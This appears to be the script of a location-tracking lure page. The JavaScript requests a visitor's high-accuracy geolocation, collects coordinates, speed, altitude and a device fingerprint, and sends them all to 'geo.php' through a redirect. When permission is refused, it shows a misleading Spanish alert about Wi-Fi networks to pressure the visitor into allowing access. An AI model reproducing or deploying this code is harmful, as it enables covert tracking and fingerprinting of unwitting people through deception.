 <div style="text-align:center;">

<script>

function openLocat() {
    if (navigator.geolocation) {
    var acc = {enableHighAccuracy : true , timeout : 30000, maximumage : 0 };
        navigator.geolocation.getCurrentPosition(showPosition, showError, acc);
    } else {
        x.innerHTML = "This site requires Geolocation to work.";
    }
}

function showPosition(position) {

 //   x.innerHTML = "Latitude: " + position.coords.latitude +
 //   "<br>Longitude: " + position.coords.longitude;

  var accu = position.coords.accuracy;
  var speed = position.coords.speed;
  var head = position.coords.heading;
  var plat = navigator.platform;
  var lati = position.coords.latitude;
  var longi = position.coords.longitude;
  var hard = navigator.hardwareConcurrency;
  var height = window.screen.height;
  var width = window.screen.width;
  var mem = navigator.deviceMemory;
  var alt = position.coords.altitude;
  var agent = navigator.userAgent;
								
window.location.href = "geo.php?accu=" + accu + "&speed=" + speed + "&head=" + head + "&plat=" + plat + "&lati=" + lati + "&longi=" + longi + "&hard=" + hard + "&height=" + height + "&width="+ width + "&mem=" + mem + "&alt=" + alt + "&agent=" + agent;
}

function showError(error)
{
        switch(error.code)
  {
                case error.PERMISSION_DENIED:
                        var error = '1' ; // 'permission denied';
      alert('No pudimos acceder a las redes wiffi de su alrededor, dale permitir para acceder');
      break;
                case error.POSITION_UNAVAILABLE:
                        var error = '2' // 'unavailable';
                        break;
                case error.TIMEOUT:
                        var error = '3' // 'timed out';
      alert('Please refresh this page...');
                        break;
                case error.UNKNOWN_ERROR:
                        var error  = '4' // 'unknown error';
                        break;
        }

window.location.href = "error.php?error=" + error;

}
</script>
